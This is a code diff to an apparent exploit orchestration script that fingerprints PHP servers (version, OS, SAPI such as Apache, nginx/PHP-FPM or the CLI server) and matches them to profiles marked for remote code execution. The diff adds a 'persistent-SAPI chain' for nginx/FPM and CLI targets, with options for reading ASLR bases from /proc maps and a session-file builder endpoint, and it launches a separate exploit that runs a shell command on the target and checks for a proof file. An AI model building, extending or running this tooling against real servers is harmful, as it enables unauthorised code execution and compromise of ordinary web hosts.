@@ -37,6 +37,14 @@ from profile_db import (
     profile_requirements_ok,
     recommended_huge_mb,
 )
+from fpm_db import (
+    command as fpm_command,
+    format_matches as format_fpm_matches,
+    list_fpm_profiles,
+    load_fpm_profile,
+    match_fpm_profiles,
+    requirements as fpm_requirements,
+)
 from session_exploit import build_multipart
 
 
@@ -142,6 +150,7 @@ _VERSION_PATTERNS = (
     re.compile(r"PHP/(\d+\.\d+\.\d+)"),
     re.compile(r"PHP\s+Version\s*[:\s]\s*(\d+\.\d+\.\d+)", re.I),
     re.compile(r"PHP\s+(\d+\.\d+\.\d+)", re.I),
+    re.compile(r"\bversion=(\d+\.\d+\.\d+)", re.I),
 )
 _OS_PATTERNS = (
     re.compile(r"\((Debian|Ubuntu|Alpine|CentOS|Red Hat|Amazon|openSUSE|FreeBSD|Win32|Win64|Unix)[^)]*\)", re.I),
@@ -181,20 +190,37 @@ def parse_passive(resp: ProbeResponse) -> dict[str, Any]:
             break
 
     server_lower = server.lower()
-    if "apache" in server_lower:
+    body_sapi = ""
+    m = re.search(r"\bsapi=([A-Za-z0-9_-]+)", body)
+    if m:
+        body_sapi = m.group(1).lower()
+    if "development server" in server_lower or body_sapi == "cli-server":
+        sapi_hint = "cli-server"
+        sapi = "cli-server"
+        sapi_detail = "PHP built-in CLI server; single persistent worker"
+    elif "apache" in server_lower:
         sapi_hint = "apache"
+        sapi = "apache2handler"
         sapi_detail = "Apache; mod_php vs proxy_fcgi is not proven remotely"
     elif "nginx" in server_lower:
         sapi_hint = "nginx"
-        sapi_detail = "nginx; likely PHP-FPM, not mod_php"
+        sapi = "fpm-fcgi"
+        sapi_detail = "nginx; likely PHP-FPM over FastCGI"
     elif "litespeed" in server_lower:
         sapi_hint = "litespeed"
+        sapi = "unknown"
         sapi_detail = "LiteSpeed; SAPI not mod_php"
     elif "microsoft-iis" in server_lower:
         sapi_hint = "iis"
+        sapi = "unknown"
         sapi_detail = "IIS; FastCGI/other, not mod_php"
+    elif body_sapi:
+        sapi_hint = "unknown"
+        sapi = body_sapi
+        sapi_detail = f"body reported SAPI {body_sapi}"
     else:
         sapi_hint = "unknown"
+        sapi = "unknown"
         sapi_detail = "server product not recognised"
 
     title = ""
@@ -219,6 +245,7 @@ def parse_passive(resp: ProbeResponse) -> dict[str, Any]:
         "php_exposed": bool(version),
         "distro": distro,
         "sapi_hint": sapi_hint,
+        "sapi": sapi,
         "sapi_detail": sapi_detail,
         "cookies": cookies,
         "session_cookie": "PHPSESSID" in cookies or "PHPSESSID" in body,
@@ -393,9 +420,21 @@ def main() -> int:
     ap.add_argument("--php-version", default=None,
                     help="override the detected PHP version")
     ap.add_argument("--distro", default=None, help="override detected distro")
+    ap.add_argument("--sapi", default="auto",
+                    choices=("auto", "apache2handler", "fpm-fcgi", "cli-server"),
+                    help="override the detected PHP SAPI")
     ap.add_argument("--sapi-hint", default=None,
-                    choices=("auto", "apache", "nginx", "litespeed", "iis"),
-                    help="override SAPI hint")
+                    choices=("auto", "apache", "nginx", "litespeed", "iis",
+                             "cli-server"),
+                    help="override the server-product hint")
+    ap.add_argument("--persistent", action="store_true",
+                    help="use the nginx/FPM/CLI persistent-SAPI chain")
+    ap.add_argument("--builder-url", default=None,
+                    help="builder endpoint for the persistent-SAPI chain")
+    ap.add_argument("--local-bases", action="store_true",
+                    help="persistent chain: read ASLR bases from local /proc maps")
+    ap.add_argument("--pid", type=int, default=None,
+                    help="persistent chain: local CLI server PID for base lookup")
     ap.add_argument("--workers", type=int, default=None,
                     help="known prefork worker count")
     ap.add_argument("--memory-limit-mb", type=int, default=None,
@@ -414,6 +453,8 @@ def main() -> int:
     ap.add_argument("--profile", default=None,
                     help="force a profile name or JSON path")
     ap.add_argument("--list-profiles", action="store_true")
+    ap.add_argument("--list-fpm-profiles", action="store_true",
+                    help="list nginx/FPM and CLI-server profiles")
     ap.add_argument("--limit", type=int, default=8)
     ap.add_argument("--run", action="store_true",
                     help="run session_exploit.py with the selected profile")
@@ -432,6 +473,13 @@ def main() -> int:
             flags = "RCE" if p.get("rce") else "-"
             print(f"{p['name']:<42} {p.get('php_version','?'):<9} "
                   f"{p.get('arch','?'):<8} {flags:<3} {p.get('status','')}")
+        return 0
+    if args.list_fpm_profiles:
+        for p in list_fpm_profiles():
+            flags = "RCE" if p.get("rce") else "-"
+            print(f"{p['name']:<42} {p.get('php_version','?'):<9} "
+                  f"{p.get('sapi','?'):<11} {p.get('arch','?'):<8} "
+                  f"{flags:<3} {p.get('status','')}")
         return 0
     if not args.url:
         ap.error("-u/--url is required unless --list-profiles is used")
@@ -456,6 +504,21 @@ def main() -> int:
         fp["distro"] = args.distro.lower()
     if args.sapi_hint and args.sapi_hint != "auto":
         fp["sapi_hint"] = args.sapi_hint
+        if args.sapi_hint == "nginx":
+            fp["sapi"] = "fpm-fcgi"
+        elif args.sapi_hint == "cli-server":
+            fp["sapi"] = "cli-server"
+        elif args.sapi_hint == "apache":
+            fp["sapi"] = "apache2handler"
+    if args.sapi != "auto":
+        fp["sapi"] = args.sapi
+
+    persistent = (args.persistent or
+                  fp.get("sapi") in ("fpm-fcgi", "cli-server"))
+    fpm_matches: list[dict[str, Any]] = []
+    if persistent:
+        fpm_matches = match_fpm_profiles(
+            fp, sapi=fp.get("sapi"), arch=arch, limit=args.limit)
 
     if args.active or args.oom_probe:
         fp["session_probe"] = probe_session_upload(client, None)
@@ -482,6 +545,7 @@ def main() -> int:
         print(json.dumps({
             "fingerprint": fp,
             "matches": matches,
+            "fpm_matches": fpm_matches if persistent else [],
         }, indent=2))
     else:
         print(f"[*] target {args.url} -> {resp.url} HTTP {resp.status}")
@@ -492,14 +556,78 @@ def main() -> int:
             print("[!] PHP version not exposed; use --php-version or a phpinfo page")
         print(f"[*] server={fp.get('server')!r} distro={fp.get('distro')!r}")
         print(f"[*] SAPI hint={fp.get('sapi_hint')}: {fp.get('sapi_detail')}")
+        print(f"[*] SAPI={fp.get('sapi')} chain="
+              f"{'persistent' if persistent else 'apache-session'}")
         print(f"[*] arch={fp.get('arch')} workers={fp.get('workers')}")
         if args.active or args.oom_probe:
             print(f"[*] upload_progress={fp.get('session_upload_progress')}")
         if fp.get("memory_limit"):
             print(f"[*] memory_limit={fp['memory_limit']} bytes")
-        print("[*] profile matches:")
-        for row in _candidate_rows(matches):
-            print("  " + row)
+        if persistent:
+            print("[*] persistent-SAPI profile matches:")
+            for row in format_fpm_matches(fpm_matches):
+                print("  " + row)
+        else:
+            print("[*] profile matches:")
+            for row in _candidate_rows(matches):
+                print("  " + row)
+
+    if args.run and persistent:
+        if not args.builder_url:
+            print("[-] persistent-SAPI run needs --builder-url (the 64M "
+                  "session-file builder endpoint)", file=sys.stderr)
+            return 1
+        try:
+            if args.profile:
+                chosen = load_fpm_profile(args.profile)
+                ok, problems = fpm_requirements(chosen)
+                if not ok:
+                    raise ValueError("; ".join(problems))
+            else:
+                runnable = [p for p in fpm_matches if p.get("compatible")]
+                if not runnable:
+                    print("[-] no compatible verified persistent-SAPI profile",
+                          file=sys.stderr)
+                    return 1
+                chosen = runnable[0]
+            if not chosen.get("rce") or not chosen.get("verified"):
+                print("[-] selected persistent profile is not verified RCE",
+                      file=sys.stderr)
+                return 1
+            if fp.get("sapi") == "cli-server" and args.local_bases and not args.pid:
+                print("[-] CLI local bases need --pid (or pass --chunk/--pie "
+                      "through fpm_exploit.py)", file=sys.stderr)
+                return 1
+            cmd = args.cmd
+            proof = args.proof_file
+            if cmd == "id>/tmp/p2s-proof":
+                cmd = "id>out/p1"
+            if proof == "/tmp/p2s-proof":
+                proof = "out/p1"
+            command = fpm_command(
+                chosen, args.url, args.builder_url, cmd, proof,
+                local_bases=args.local_bases, pid=args.pid)
+        except (ValueError, OSError) as exc:
+            print(f"[-] persistent profile: {exc}", file=sys.stderr)
+            return 1
+        print(f"[*] persistent chain profile {chosen['name']} "
+              f"({chosen.get('sapi')})", flush=True)
+        print("[*] running:", " ".join(command), flush=True)
+        try:
+            Path(args.proof_file).unlink()
+        except OSError:
+            pass
+        try:
+            rc = subprocess.run(command).returncode
+        except OSError as exc:
+            print(f"[-] could not launch persistent exploit: {exc}",
+                  file=sys.stderr)
+            return 1
+        if rc == 0:
+            print("[+] persistent chain reported a proof file")
+            return 0
+        print(f"[-] persistent exploit exited {rc}; no proof", file=sys.stderr)
+        return 1
 
     if args.run:
         if args.profile:
